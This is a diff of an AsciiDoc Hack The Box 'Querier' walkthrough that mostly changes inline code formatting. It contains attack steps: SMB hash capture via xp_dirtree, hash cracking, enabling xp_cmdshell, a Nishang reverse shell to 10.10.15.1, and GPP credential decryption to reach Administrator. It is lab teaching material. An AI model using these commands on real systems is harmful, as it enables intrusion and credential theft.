@@ -20,22 +20,22 @@ In my opinion,
 link:https://www.hackthebox.eu/home/machines/profile/175[Querier]
 is a great box.
 By following the steps below
-we will learn a bit about +Windows+
+we will learn a bit about `Windows`
 (a widely used operating system) pentesting.
-The challenge begins with a public +SMB+;
+The challenge begins with a public `SMB`;
 this is our first challenge level.
-Next, we will work with +SQL Server+
-and we will need to use a special +SQL+ query
+Next, we will work with `SQL Server`
+and we will need to use a special `SQL` query
 to get the user hash.
 Finally, we will take advantage of an insecure configuration
-in +Group Policy Preferences+ in +Windows+
+in `Group Policy Preferences` in `Windows`
 to escalate to administrator privileges.
 
 
 == Scanning Phase
 
 The first thing to do is check the connection
-to the machine with a simple +ping+ command.
+to the machine with a simple `ping` command.
 We need a stable connection
 with the box to make sure that
 we will not lose all of our progress.
@@ -52,7 +52,7 @@ image::ip.png[ip]
 .Doing ping
 image::ping.png[ping]
 
-Next, we can use +nmap+ to find open ports in the machine.
+Next, we can use `nmap` to find open ports in the machine.
 A simple port scanning is enough for our purposes.
 
 [source, bash]
@@ -63,29 +63,29 @@ $ nmap -Pn 10.10.10.125
 .Port scanning
 image::nmap.png[nmap]
 
-We see 4 open ports (+135+, +139+, +445+ and +1433+)
+We see 4 open ports (`135`, `139`, `445` and `1433`)
 and among these,
 we found two interesting services,
-+microsoft-ds (SMB)+ in port +445+ and
-+ms-sql-s+ in port +1433+.
+`microsoft-ds (SMB)` in port `445` and
+`ms-sql-s` in port `1433`.
 When we try to access via SMB,
 it shows us a shared folder called `Report` with a `.xlsm` file,
-the extension indicating a +Microsoft Excel Document+.
+the extension indicating a `Microsoft Excel Document`.
 
 .Public share
 image::share.png[share]
 
-Then we open the specified file with +Microsoft Excel+ and
+Then we open the specified file with `Microsoft Excel` and
 a warning message appears telling us that
 the file contains a suspicious macro.
 
 .Macro alert
 image::alert.png[alert]
 
-We can explore the macro code in +Microsoft Excel+
-using the option +Visual Basic+ in the Developer Tab.
+We can explore the macro code in `Microsoft Excel`
+using the option `Visual Basic` in the Developer Tab.
 The macro has an insecure configuration
-of a connection to +SQL Server+,
+of a connection to `SQL Server`,
 the credentials are in plain text and now we can use them.
 It's a good example of something
 that we should never do.
@@ -96,11 +96,11 @@ image::macro.png[macro]
 == Getting User
 
 Now we can connect to the other interesting service
-that we found: +ms-sql-s+.
-We use the module +mssqlclient.py+ of +Impacket+
+that we found: `ms-sql-s`.
+We use the module `mssqlclient.py` of `Impacket`
 to do queries to the server interactively
 using the credentials found in the last step,
-for example a query to know the version of +SQL Server+
+for example a query to know the version of `SQL Server`
 like the first testing query.
 
 [source, bash]
@@ -113,13 +113,13 @@ image::mssql-conection.png[mssql-conection]
 
 We will use this service to gain system access,
 as a user without privileges.
-We mount an +SMB+ server in our machine
+We mount an `SMB` server in our machine
 to capture the authentication of any Windows user,
-in this case, the user that executes the service +ms-sql-s+.
+in this case, the user that executes the service `ms-sql-s`.
 We tell it to enter our share
-to capture its +NTLMv2+ hash with an +xp_dirtree+ query.
-This stored procedure of +SQL Server+
-will access our +SMB+ share
+to capture its `NTLMv2` hash with an `xp_dirtree` query.
+This stored procedure of `SQL Server`
+will access our `SMB` share
 to display a list of every folder,
 every subfolder, and every file.
 
@@ -137,13 +137,13 @@ $ smbserver.py -smb2support querier Documents/
 image::mssql-hash.png[mssql-hash]
 
 Then we copy the hash to a plain text file and
-use +John the Ripper+ with the dictionary +rockyou.txt+
+use `John the Ripper` with the dictionary `rockyou.txt`
 to crack the captured hash.
 We need to specify the correct hash format because
-+John the Ripper+ occasionally recognizes your hashes as the wrong type.
+`John the Ripper` occasionally recognizes your hashes as the wrong type.
 This is inevitable because
 some hashes look identical,
-in this case the correct format for +NTLMv2+ is +netntlmv2+.
+in this case the correct format for `NTLMv2` is `netntlmv2`.
 
 [source, bash]
 ----
@@ -154,10 +154,10 @@ $ john.exe --wordlist=rockyou.txt --format-netntlmv2 \\
 .Runnnig John
 image::john.png[john]
 
-Now we can connect to +SQL Server+ as user +mssql-svc+.
-We try to execute the command +whoami+, however,
+Now we can connect to `SQL Server` as user `mssql-svc`.
+We try to execute the command `whoami`, however,
 it responds telling us that
-component +xp_cmdshell+ is blocked.
+component `xp_cmdshell` is blocked.
 Since we are the service administrator,
 we can enable it using a few queries.
 
@@ -192,8 +192,8 @@ image::flag-user.png[flag-user]
 This method of executing commands
 may be an inconvenient way to escalate privileges,
 so we will upload a shell to the server.
-To do this we will use the script +Invoke-PowerShellTcp.ps1+
-of +Nishang+ framework.
+To do this we will use the script `Invoke-PowerShellTcp.ps1`
+of `Nishang` framework.
 Before uploading the shell
 we add our IP address and
 some free port to make the connection.
@@ -206,8 +206,8 @@ Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.1 -Port 30000
 .Invoke-PowerShellTcp code
 image::ip-shell.png[ip-shell]
 
-Then it is necessary to start an +HTTP+ server in our machine.
-We can do it with +Python3+.
+Then it is necessary to start an `HTTP` server in our machine.
+We can do it with `Python3`.
 
 [source, bash]
 ----
@@ -218,7 +218,7 @@ $ python -m http.server
 image::python-server.png[python-server]
 
 To make the server download our file,
-we can use +Powershell+ as follows.
+we can use `Powershell` as follows.
 
 [source, bash]
 ----
@@ -228,8 +228,8 @@ we can use +Powershell+ as follows.
 ----
 
 Now to get an interactive shell
-we set our machine to listen +port 30000+ and
-execute the script in the +HTB+ machine.
+we set our machine to listen `port 30000` and
+execute the script in the `HTB` machine.
 
 [source, bash]
 ----
@@ -245,15 +245,15 @@ $ nc -lvp 30000
 .Interactive shell
 image::shell-nc.png[shell-nc]
 
-At this point we use the module +PowerUp.ps1+
-from the +PowerSploit+ collection to scan the system
+At this point we use the module `PowerUp.ps1`
+from the `PowerSploit` collection to scan the system
 to find a way to escalate privileges.
 We can use the same method as in the last step.
-We upload the file to the server with +Python3+.
+We upload the file to the server with `Python3`.
 
 To execute the script we need to import it first,
 next we can run all checks
-with the command +Invoke-AllChecks+.
+with the command `Invoke-AllChecks`.
 It will output any identifiable vulnerabilities
 along with specifications for any abuse functions.
 
@@ -270,7 +270,7 @@ We can see the Administrator credentials
 in plain text in the script output.
 The script took advantage
 of an insecure configuration
-in +Group Policy Preferences+ of +Windows+;
+in `Group Policy Preferences` of `Windows`;
 it saves credentials with weak encryptions.
 It’s time to prove these and
 to obtain the root flag.
@@ -279,7 +279,7 @@ to obtain the root flag.
 image::root-credentials.png[root-credentials]
 
 Finally, we can get an interactive shell
-as Administrator with +psxec.py+ from +Impacket+.
+as Administrator with `psxec.py` from `Impacket`.
 With this, we can read the root flag.
 
 [source, bash]
@@ -292,10 +292,10 @@ image::psexec.png[psexec]
 
 Another way to get the root flag
 could be to find the file
-+C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml+
-using a native tool like +findstr+ and
+`C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml`
+using a native tool like `findstr` and
 decrypt the password using
-the +gpp-decrypt+ tool of +Kali Linux+.
+the `gpp-decrypt` tool of `Kali Linux`.
 
 .Encrypted password
 image::crypt.png[crypt]
@@ -306,8 +306,8 @@ image::decrypt.png[decrypt]
 In this challenge,
 we saw some insecure configurations
 such as saved credentials in plain text in code.
-We also learned how to start an +SMB+ server
+We also learned how to start an `SMB` server
 in our machine to capture hashes and
 finally, we learned and used some important tools
-for pentesting in +Windows+ like
-+Impacket+, +Nishang+, and +PowerSploit+.
+for pentesting in `Windows` like
+`Impacket`, `Nishang`, and `PowerSploit`.
